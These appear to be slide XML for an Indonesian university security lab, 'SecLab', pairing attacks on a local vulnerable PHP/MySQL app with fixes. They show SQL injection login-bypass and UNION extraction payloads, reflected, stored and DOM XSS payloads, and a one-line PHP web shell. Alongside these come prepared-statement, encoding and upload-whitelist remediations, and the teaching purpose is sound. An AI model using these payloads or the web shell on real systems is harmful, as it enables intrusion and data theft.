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[ HANDS-ON CYBERSECURITY &amp; THREAT SIMULATION ]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SecLab: Real-World Web Exploit &amp; Defense</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FACC15"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Simulasi Kebocoran Data Perusahaan (Data Breach), SQLi Auth Bypass, Triad XSS, Web Shell RCE &amp; Remediasi Kode Aman</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="2800"/>
              </a:spcBef>
              <a:defRPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Engine: SecLab Enterprise | Database: MySQL (seclab_db) via phpMyAdmin | Mode: Vulnerable vs Secure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MODUL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Topologi Sistem Lab &amp; Data Sensitif MySQL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Mengapa simulasi ini merefleksikan insiden kebocoran data di dunia nyata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C084FC"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[Real Database Storage] Database MySQL seclab_db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Tersambung langsung ke phpMyAdmin lokal. Berisi tabel users (kredensial nyata, NIK KTP, Kartu Kredit, Gaji, dan API Token).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[Entry Gate Attack] Login Portal (Auth Bypass)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Autentikasi login karyawan dengan celah SQL Injection. Penyerang dapat masuk tanpa password sebagai Super Administrator.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ACC15"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[Data Exfiltration] Direktori Profil &amp; UNION SQLi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Endpoint pencarian karyawan internal yang rentan terhadap exfiltration seluruh data rahasia perusahaan.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[Proof of Leak Audit] Live DB Inspector &amp; Audit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Fitur verifikasi langsung untuk membandingkan data hasil eksploitasi dengan rekaman fisik di phpMyAdmin.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ATTACK VECTOR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SQL Injection: Login Authentication Bypass (login.php)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Bagaimana penyerang melewati proteksi password tanpa kredensial yang sah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Anatomi Kerentanan pada login.php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Kueri Rentan:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SELECT * FROM users WHERE username = '$u' AND password = '$p'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Input Penyerang (Username):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>superadmin' #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Kueri yang Dijalankan MySQL:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SELECT * FROM users WHERE username = 'superadmin' #' AND password = '...'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Hasil: Tanda '#' memotong verifikasi password. Database mengembalikan user admin, sesi dibuat, login sukses 100%!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Universal Bypass &amp; Remediasi Kode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Payload Universal (Login Akun Pertama):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>' OR 1=1 LIMIT 1 #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Remediasi Standar Industri (Prepared Statements):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>$stmt = $mysqli-&gt;prepare('SELECT id, fullname, role FROM users WHERE username = ? AND password = ?');</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>$stmt-&gt;bind_param('ss', $username, $password);</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>$stmt-&gt;execute();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Prinsip Keamanan: Input diperlakukan murni sebagai parameter data, bukan instruksi logika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ATTACK VECTOR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SQL Injection: UNION-Based Data Exfiltration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Mengekstraksi NIK KTP, Gaji, Kartu Kredit, &amp; Flag Rahasia dari MySQL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C084FC"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Metodologi Ekstraksi Data Bocor (Real Data Breach)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1. Penentuan Jumlah Kolom &amp; Tipe Data: Penyerang mencocokkan jumlah kolom tabel utama (5 kolom: id, fullname, username, email, role).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2. Penyusunan Payload UNION SELECT:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   ' UNION SELECT id, fullname, password, credit_card, api_secret_key FROM users #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3. Ekstraksi Data Sensitif:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Kartu Kredit Pimpinan: 4532-8921-3341-9012</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • NIK KTP: 3271041982050001 | Gaji: Rp 45.000.000</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Secret Token Flag: FLAG{sql1_b0c0r_d4t4_kr3d3ns14l_m4st3r}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4. Pembuktian Validitas: Mahasiswa dapat membuka tab Live DB Inspector atau phpMyAdmin untuk memverifikasi data yang bocor.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ATTACK VECTOR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Cross-Site Scripting (XSS) Triad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Perbandingan 3 varian XSS pada SecLab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Reflected XSS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[Non-Persistent]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Payload dikirim via parameter GET/POST (search bar) dan langsung dipantulkan di respon browser korban.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="FACC15"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Payload Contoh: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&lt;script&gt;alert(document.domain)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cara Patch: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htmlspecialchars($q, ENT_QUOTES, 'UTF-8')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Stored XSS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[Persistent (Tersimpan di MySQL)]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Payload masuk permanen ke tabel comments MySQL. Semua user yang melihat feed diskusi otomatis terinfeksi malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Payload Contoh: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&lt;img src=x onerror="alert('Stored XSS Pwned')"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cara Patch: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Sanitasi input + Contextual HTML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DOM-Based XSS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[Client-Side Only]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Eksekusi terjadi murni di DOM engine browser (Source: location.hash -&gt; Sink: innerHTML). Server MySQL tidak menerima traffic ini.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Payload Contoh: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#&lt;img src=1 onerror=alert('DOM_XSS')&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Cara Patch: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Ganti innerHTML dengan textContent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ATTACK VECTOR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Insecure File Upload ke Remote Code Execution (RCE)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Dari formulir upload avatar menuju pengambilalihan kendali server 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Rantai Serangan Web Shell (Kill Chain)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1. Pembuatan Web Shell (sample_materials/webshell.php):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   &lt;?php echo shell_exec($_GET['cmd']); ?&gt;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2. Upload Berkas Tanpa Whitelist Ekstensi: Aplikasi menyimpan berkas langsung ke direktori publik `/uploads/`.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3. Trigger Eksekusi Perintah OS:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   http://localhost/seclab-cybersecurity/uploads/webshell.php?cmd=whoami</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   http://localhost/seclab-cybersecurity/uploads/webshell.php?cmd=dir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4. Defense-in-Depth (Pencegahan Berlapis):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Whitelist Ekstensi Ketat: Hanya izinkan format [jpg, jpeg, png, pdf].</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Validasi MIME Magic Byte: Gunakan finfo_file() bukan sekadar header Content-Type klien.</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Randomize Nama Berkas: Ubah nama menjadi hash unik (bin2hex(random_bytes(16)) . '.' . $ext).</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>   • Nonaktifkan script execution permission pada folder /uploads/.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LEARNING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Dual-Mode Engine &amp; Live Database Inspector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Metodologi evaluasi ganda: Eksploitasi (Red Team) dan Remediasi (Blue Team)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Vulnerable Mode (Red Team)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Aplikasi mengeksekusi kueri langsung dan merender input tanpa sanitasi. Mahasiswa mempraktikkan eksploitasi dan pengumpulan flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1400"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Target Pembelajaran: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Bypass login admin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Dapatkan data kartu kredit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Trigger XSS popup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Upload web shell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Secure Mode / Patched (Blue Team)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Aplikasi menerapkan Prepared Statements, Whitelisting, dan HTML Output Encoding. Mahasiswa membuktikan eksploitasi gagal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1400"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Target Pembelajaran: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Pahami prepared statement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Terapkan output encoding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Validasi file whitelist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Uji ulang serangan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Live DB Inspector (Auditing)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Menampilkan isi tabel MySQL seclab_db secara langsung untuk memverifikasi integritas data dan payload tersimpan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1400"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Target Pembelajaran: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Cek tabel users MySQL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Audit tabel comments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Sinkronisasi phpMyAdmin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✓ Validasi bukti laporan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PRACTICAL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Rundown Praktikum Kelas (150 Menit)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Alokasi waktu dan target capaian mahasiswa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7772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00 - 25 Menit  |  Briefing Teori &amp; Skenario Data Breach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Review konsep OWASP Top 10, struktur tabel MySQL seclab_db, dan aturan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8655" cy="7772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25 - 75 Menit  |  Hands-on Exploitation (Red Team)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Mahasiswa melakukan Auth Bypass login, ekstraksi kartu kredit/flag, XSS, dan Web Shell.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7772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75 - 115 Menit  |  Analisis Kode &amp; Secure Coding (Blue Team)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Mahasiswa mempelajari implementasi patch di Secure Mode dan memverifikasi serangan gagal.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728655" cy="7772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115 - 140 Menit  |  Penyusunan Laporan &amp; Bukti phpMyAdmin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Mengambil screenshot pembuktian dari Live DB Inspector dan phpMyAdmin.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8655" cy="7772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140 - 150 Menit  |  Evaluasi Dosen &amp; Submission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Review hasil temuan kelas dan penilaian capaian praktikum.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